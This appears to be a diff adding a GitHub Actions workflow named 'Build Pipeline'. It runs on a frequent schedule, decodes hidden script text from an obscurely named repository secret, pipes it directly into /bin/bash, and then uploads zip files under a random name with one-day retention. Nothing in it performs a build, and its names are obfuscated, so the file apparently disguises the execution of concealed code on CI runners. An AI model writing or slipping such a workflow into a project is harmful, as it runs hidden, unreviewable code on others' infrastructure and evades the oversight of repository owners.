@@ -1,0 +1,33 @@
+name: Build Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '56 2,8,14,20 * * *'
+permissions:
+  contents: read
+  actions: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  deploy:
+    name: Main task
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+      - name: Bootstrap
+        env:
+          kujn9308: ${{ secrets.kujn9308 }}
+        run: |
+          printf '%s' "$kujn9308" | jq -r .ayss36649 | /bin/bash
+          printf '%s' "$fy09" | jq -r .fw53 | /bin/bash
+          printf '%s' "$h2" | jq -r .bsy78 | /bin/bash
+
+      - name: Archive artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: XhKmtDTv
+          path: "*.zip"
+          retention-days: 1
